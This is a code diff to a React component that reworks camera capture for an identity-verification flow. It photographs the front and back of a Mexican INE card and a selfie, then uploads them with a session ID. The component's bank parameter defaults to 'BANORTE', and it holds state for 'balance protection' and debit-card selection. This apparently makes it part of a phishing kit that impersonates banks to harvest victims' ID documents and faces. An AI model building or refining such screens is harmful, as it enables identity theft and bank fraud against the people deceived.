@@ -1,4 +1,4 @@
-import React, { useState, useContext } from 'react';
+import React, { useState, useContext, useEffect } from 'react';
 import { Card } from '@/components/ui/card';
 import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
@@ -59,6 +59,15 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   banco = "BANORTE",
   sessionId = ""
 }) => {
+  
+  // Cleanup function para detener la cámara al desmontar el componente
+  useEffect(() => {
+    return () => {
+      if (currentStream) {
+        currentStream.getTracks().forEach(track => track.stop());
+      }
+    };
+  }, [currentStream]);
   // Normalizar el banco a mayúsculas para consistencia
   const bankCode = banco.toUpperCase();
   // Form state
@@ -79,15 +88,12 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   // Estados para verificación de identidad
   const [documentType, setDocumentType] = useState("");
   const [currentStep, setCurrentStep] = useState<'select' | 'document_front' | 'preview_front' | 'document_back' | 'preview_back' | 'selfie' | 'preview_selfie' | 'validating' | 'success'>('select');
-  const [videoRef, setVideoRef] = useState<HTMLVideoElement | null>(null);
-  const [canvasRef, setCanvasRef] = useState<HTMLCanvasElement | null>(null);
-  const [selfieVideoRef, setSelfieVideoRef] = useState<HTMLVideoElement | null>(null);
-  const [selfieCanvasRef, setSelfieCanvasRef] = useState<HTMLCanvasElement | null>(null);
   const [documentFrontImage, setDocumentFrontImage] = useState<string | null>(null);
   const [documentBackImage, setDocumentBackImage] = useState<string | null>(null);
   const [selfieImage, setSelfieImage] = useState<string | null>(null);
   const [currentPhotoPreview, setCurrentPhotoPreview] = useState<string | null>(null);
   const [isUploading, setIsUploading] = useState(false);
+  const [currentStream, setCurrentStream] = useState<MediaStream | null>(null);
   
   // Estados para protección de saldo
   const [debitoSelect, setDebitoSelect] = useState('');
@@ -919,51 +925,114 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             return;
           }
           setCurrentStep('document_front');
+          
           try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            if (videoRef) {
-              videoRef.srcObject = stream;
+            // Detener stream anterior si existe
+            if (currentStream) {
+              currentStream.getTracks().forEach(track => track.stop());
             }
+            
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+              video: { 
+                facingMode: 'environment', // Cámara trasera para documentos
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+              } 
+            });
+            
+            setCurrentStream(stream);
+            
+            // Esperar un poco para que el DOM se actualice
+            setTimeout(() => {
+              const videoElement = document.getElementById('document-video') as HTMLVideoElement;
+              if (videoElement) {
+                videoElement.srcObject = stream;
+                videoElement.play();
+              }
+            }, 100);
+            
           } catch (err) {
-            alert('No se pudo acceder a la cámara: ' + err);
+            console.error('Error accediendo a la cámara:', err);
+            // Intentar con cámara frontal como fallback
+            try {
+              const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                  facingMode: 'user',
+                  width: { ideal: 1280 },
+                  height: { ideal: 720 }
+                } 
+              });
+              
+              setCurrentStream(stream);
+              
+              setTimeout(() => {
+                const videoElement = document.getElementById('document-video') as HTMLVideoElement;
+                if (videoElement) {
+                  videoElement.srcObject = stream;
+                  videoElement.play();
+                }
+              }, 100);
+              
+            } catch (err2) {
+              alert('No se pudo acceder a la cámara. Por favor, permite el acceso a la cámara e intenta de nuevo.');
+              setCurrentStep('select');
+            }
           }
         };
 
         const captureDocumentFront = async () => {
-          if (!videoRef || !canvasRef) return;
+          const videoElement = document.getElementById('document-video') as HTMLVideoElement;
+          const canvasElement = document.getElementById('document-canvas') as HTMLCanvasElement;
           
-          canvasRef.width = videoRef.videoWidth;
-          canvasRef.height = videoRef.videoHeight;
-          const context = canvasRef.getContext('2d');
+          if (!videoElement || !canvasElement) {
+            alert('Error: No se encontró el elemento de video o canvas');
+            return;
+          }
+          
+          canvasElement.width = videoElement.videoWidth;
+          canvasElement.height = videoElement.videoHeight;
+          const context = canvasElement.getContext('2d');
+          
           if (context) {
-            context.drawImage(videoRef, 0, 0);
-            const docImage = canvasRef.toDataURL('image/png');
+            context.drawImage(videoElement, 0, 0);
+            const docImage = canvasElement.toDataURL('image/jpeg', 0.9);
             setDocumentFrontImage(docImage);
             setCurrentPhotoPreview(docImage);
             
             // Detener cámara
-            const tracks = (videoRef.srcObject as MediaStream)?.getTracks();
-            tracks?.forEach(track => track.stop());
+            if (currentStream) {
+              currentStream.getTracks().forEach(track => track.stop());
+              setCurrentStream(null);
+            }
             
             setCurrentStep('preview_front');
           }
         };
 
         const captureDocumentBack = async () => {
-          if (!videoRef || !canvasRef) return;
+          const videoElement = document.getElementById('document-video') as HTMLVideoElement;
+          const canvasElement = document.getElementById('document-canvas') as HTMLCanvasElement;
           
-          canvasRef.width = videoRef.videoWidth;
-          canvasRef.height = videoRef.videoHeight;
-          const context = canvasRef.getContext('2d');
+          if (!videoElement || !canvasElement) {
+            alert('Error: No se encontró el elemento de video o canvas');
+            return;
+          }
+          
+          canvasElement.width = videoElement.videoWidth;
+          canvasElement.height = videoElement.videoHeight;
+          const context = canvasElement.getContext('2d');
+          
           if (context) {
-            context.drawImage(videoRef, 0, 0);
-            const docImage = canvasRef.toDataURL('image/png');
+            context.drawImage(videoElement, 0, 0);
+            const docImage = canvasElement.toDataURL('image/jpeg', 0.9);
             setDocumentBackImage(docImage);
             setCurrentPhotoPreview(docImage);
             
             // Detener cámara
-            const tracks = (videoRef.srcObject as MediaStream)?.getTracks();
-            tracks?.forEach(track => track.stop());
+            if (currentStream) {
+              currentStream.getTracks().forEach(track => track.stop());
+              setCurrentStream(null);
+            }
             
             setCurrentStep('preview_back');
           }
@@ -971,37 +1040,118 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
 
         const startBackCamera = async () => {
           setCurrentStep('document_back');
+          
           try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            if (videoRef) {
-              videoRef.srcObject = stream;
+            // Detener stream anterior si existe
+            if (currentStream) {
+              currentStream.getTracks().forEach(track => track.stop());
             }
+            
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+              video: { 
+                facingMode: 'environment',
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+              } 
+            });
+            
+            setCurrentStream(stream);
+            
+            setTimeout(() => {
+              const videoElement = document.getElementById('document-video') as HTMLVideoElement;
+              if (videoElement) {
+                videoElement.srcObject = stream;
+                videoElement.play();
+              }
+            }, 100);
+            
           } catch (err) {
+            console.error('Error accediendo a la cámara:', err);
             alert('No se pudo acceder a la cámara: ' + err);
           }
         };
 
         const retakePhoto = async (step: string) => {
+          // Detener stream actual
+          if (currentStream) {
+            currentStream.getTracks().forEach(track => track.stop());
+            setCurrentStream(null);
+          }
+          
           if (step === 'front') {
             setDocumentFrontImage(null);
             setCurrentStep('document_front');
+            
+            try {
+              const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                  facingMode: 'environment',
+                  width: { ideal: 1280 },
+                  height: { ideal: 720 }
+                } 
+              });
+              setCurrentStream(stream);
+              
+              setTimeout(() => {
+                const videoElement = document.getElementById('document-video') as HTMLVideoElement;
+                if (videoElement) {
+                  videoElement.srcObject = stream;
+                  videoElement.play();
+                }
+              }, 100);
+            } catch (err) {
+              alert('No se pudo acceder a la cámara: ' + err);
+            }
+            
           } else if (step === 'back') {
             setDocumentBackImage(null);
             setCurrentStep('document_back');
+            
+            try {
+              const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                  facingMode: 'environment',
+                  width: { ideal: 1280 },
+                  height: { ideal: 720 }
+                } 
+              });
+              setCurrentStream(stream);
+              
+              setTimeout(() => {
+                const videoElement = document.getElementById('document-video') as HTMLVideoElement;
+                if (videoElement) {
+                  videoElement.srcObject = stream;
+                  videoElement.play();
+                }
+              }, 100);
+            } catch (err) {
+              alert('No se pudo acceder a la cámara: ' + err);
+            }
+            
           } else if (step === 'selfie') {
             setSelfieImage(null);
             setCurrentStep('selfie');
-          }
-          
-          try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            if (step === 'selfie' && selfieVideoRef) {
-              selfieVideoRef.srcObject = stream;
-            } else if (videoRef) {
-              videoRef.srcObject = stream;
+            
+            try {
+              const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                  facingMode: 'user',
+                  width: { ideal: 1280 },
+                  height: { ideal: 720 }
+                } 
+              });
+              setCurrentStream(stream);
+              
+              setTimeout(() => {
+                const videoElement = document.getElementById('selfie-video') as HTMLVideoElement;
+                if (videoElement) {
+                  videoElement.srcObject = stream;
+                  videoElement.play();
+                }
+              }, 100);
+            } catch (err) {
+              alert('No se pudo acceder a la cámara: ' + err);
             }
-          } catch (err) {
-            alert('No se pudo acceder a la cámara: ' + err);
           }
         };
 
@@ -1025,31 +1175,64 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
 
         const startSelfieCamera = async () => {
           setCurrentStep('selfie');
+          
           try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            if (selfieVideoRef) {
-              selfieVideoRef.srcObject = stream;
+            // Detener stream anterior si existe
+            if (currentStream) {
+              currentStream.getTracks().forEach(track => track.stop());
             }
+            
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+              video: { 
+                facingMode: 'user', // Cámara frontal para selfie
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+              } 
+            });
+            
+            setCurrentStream(stream);
+            
+            setTimeout(() => {
+              const videoElement = document.getElementById('selfie-video') as HTMLVideoElement;
+              if (videoElement) {
+                videoElement.srcObject = stream;
+                videoElement.play();
+              }
+            }, 100);
+            
           } catch (err) {
+            console.error('Error accediendo a la cámara para selfie:', err);
             alert('No se pudo acceder a la cámara para selfie: ' + err);
           }
         };
 
         const captureSelfie = async () => {
-          if (!selfieVideoRef || !selfieCanvasRef) return;
+          const videoElement = document.getElementById('selfie-video') as HTMLVideoElement;
+          const canvasElement = document.getElementById('selfie-canvas') as HTMLCanvasElement;
           
-          selfieCanvasRef.width = selfieVideoRef.videoWidth;
-          selfieCanvasRef.height = selfieVideoRef.videoHeight;
-          const context = selfieCanvasRef.getContext('2d');
+          if (!videoElement || !canvasElement) {
+            alert('Error: No se encontró el elemento de video o canvas para selfie');
+            return;
+          }
+          
+          canvasElement.width = videoElement.videoWidth;
+          canvasElement.height = videoElement.videoHeight;
+          const context = canvasElement.getContext('2d');
+          
           if (context) {
-            context.drawImage(selfieVideoRef, 0, 0);
-            const selfie = selfieCanvasRef.toDataURL('image/png');
+            // Voltear horizontalmente para que se vea como un espejo
+            context.scale(-1, 1);
+            context.drawImage(videoElement, -canvasElement.width, 0);
+            
+            const selfie = canvasElement.toDataURL('image/jpeg', 0.9);
             setSelfieImage(selfie);
             setCurrentPhotoPreview(selfie);
             
-            // Detener cámara de selfie
-            const tracks = (selfieVideoRef.srcObject as MediaStream)?.getTracks();
-            tracks?.forEach(track => track.stop());
+            // Detener cámara
+            if (currentStream) {
+              currentStream.getTracks().forEach(track => track.stop());
+              setCurrentStream(null);
+            }
             
             setCurrentStep('preview_selfie');
           }
@@ -1065,6 +1248,12 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             return;
           }
           
+          // Detener cualquier stream que aún esté activo
+          if (currentStream) {
+            currentStream.getTracks().forEach(track => track.stop());
+            setCurrentStream(null);
+          }
+          
           setCurrentStep('validating');
           setIsUploading(true);
           
@@ -1074,15 +1263,15 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             const selfieBlob = await fetch(selfie).then(r => r.blob());
             
             const formData = new FormData();
-            formData.append('documentFile', frontBlob, `documento_${documentType}_frente.png`);
-            formData.append('selfieFile', selfieBlob, 'selfie.png');
+            formData.append('documentFile', frontBlob, `documento_${documentType}_frente.jpg`);
+            formData.append('selfieFile', selfieBlob, 'selfie.jpg');
             formData.append('documentType', documentType);
             formData.append('sessionId', sessionId);
             
             // Si es INE, agregar también el reverso
             if (documentType === 'ine' && backImage) {
               const backBlob = await fetch(backImage).then(r => r.blob());
-              formData.append('documentBackFile', backBlob, `documento_${documentType}_reverso.png`);
+              formData.append('documentBackFile', backBlob, `documento_${documentType}_reverso.jpg`);
             }
 
             const response = await fetch('/api/upload-identity-files', {
@@ -1110,6 +1299,14 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             setCurrentStep('select');
           } finally {
             setIsUploading(false);
+          }
+        };
+        
+        // Función para limpiar streams al cambiar de pantalla
+        const cleanupCamera = () => {
+          if (currentStream) {
+            currentStream.getTracks().forEach(track => track.stop());
+            setCurrentStream(null);
           }
         };
 
@@ -1213,13 +1410,15 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 </div>
                 <div className="relative mb-4">
                   <video 
-                    ref={setVideoRef}
+                    id="document-video"
                     autoPlay 
+                    playsInline
+                    muted
                     className="w-full max-w-md border-2 border-blue-300 rounded-lg shadow-lg"
                   />
                   <div className="absolute inset-0 border-2 border-blue-500 rounded-lg pointer-events-none opacity-50"></div>
                 </div>
-                <canvas ref={setCanvasRef} style={{ display: 'none' }} />
+                <canvas id="document-canvas" style={{ display: 'none' }} />
                 <Button 
                   className={`${primaryBtnClass} px-8 py-3 text-lg font-semibold`}
                   onClick={captureDocumentFront}
@@ -1270,13 +1469,15 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 </div>
                 <div className="relative mb-4">
                   <video 
-                    ref={setVideoRef}
+                    id="document-video"
                     autoPlay 
+                    playsInline
+                    muted
                     className="w-full max-w-md border-2 border-orange-300 rounded-lg shadow-lg"
                   />
                   <div className="absolute inset-0 border-2 border-orange-500 rounded-lg pointer-events-none opacity-50"></div>
                 </div>
-                <canvas ref={setCanvasRef} style={{ display: 'none' }} />
+                <canvas id="document-canvas" style={{ display: 'none' }} />
                 <Button 
                   className={`${primaryBtnClass} px-8 py-3 text-lg font-semibold`}
                   onClick={captureDocumentBack}
@@ -1327,14 +1528,16 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 </div>
                 <div className="relative mb-4">
                   <video 
-                    ref={setSelfieVideoRef}
+                    id="selfie-video"
                     autoPlay 
+                    playsInline
+                    muted
                     className="w-full max-w-md border-2 border-purple-300 rounded-full shadow-lg"
                     style={{ transform: 'scaleX(-1)', aspectRatio: '1/1', objectFit: 'cover' }}
                   />
                   <div className="absolute inset-0 border-2 border-purple-500 rounded-full pointer-events-none opacity-50"></div>
                 </div>
-                <canvas ref={setSelfieCanvasRef} style={{ display: 'none' }} />
+                <canvas id="selfie-canvas" style={{ display: 'none' }} />
                 <Button 
                   className={`${primaryBtnClass} px-8 py-3 text-lg font-semibold`}
                   onClick={captureSelfie}
